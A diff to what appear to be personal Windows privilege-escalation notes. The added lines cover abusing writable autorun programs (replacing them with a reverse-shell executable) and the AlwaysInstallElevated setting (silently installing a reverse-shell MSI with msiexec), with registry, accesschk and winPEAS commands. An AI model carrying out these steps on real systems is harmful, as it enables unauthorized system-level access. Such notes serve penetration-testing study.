@@ -38,9 +38,24 @@ EXPLOITATION: replace file with reverseshell.exe and start service.
 FIND DLL SERVICE, CHECK PERMISSIONS (START/STOP), COPY SERVICE THAT HAVE DLL ON LOCAL HOST AND ANALYZE WITH procmon, we need find file with result NAME_NOT_FOUND.
 GENERATE REVERSE SHELL, TRANSFER ON WINDOWS MACHINE, PLACE IN DIR WHERE SERVICE SEARCH DLL, START SERVICE.
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 REGISTRY
 
+#################################### AUTORUNS #####################################################
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run.
+.\accesscheck.exe /accespeula -wvu "[program name from reg query]".
+copy /Y reverseshell.exe "PATH TO PROGRAM".
+RESTART WINDOWS.
 
+#################################### ALLWAYSINSTALLELEVATED #####################################################
+
+THE AllwaysInstallElevated registry MUST set to 1 for both the local machine and current user.
+WINPEAS: .\winpeasany.exe quiet windowscreds.
+MANUALLY VERIFY: reg query [registry].
+CREATE REVERSE MSI FILE.
+RUN MSI: msiexec /quiet /qn /i /reverseshell.msi
+
+#################################### PASSWORDS #####################################################
 
 
 
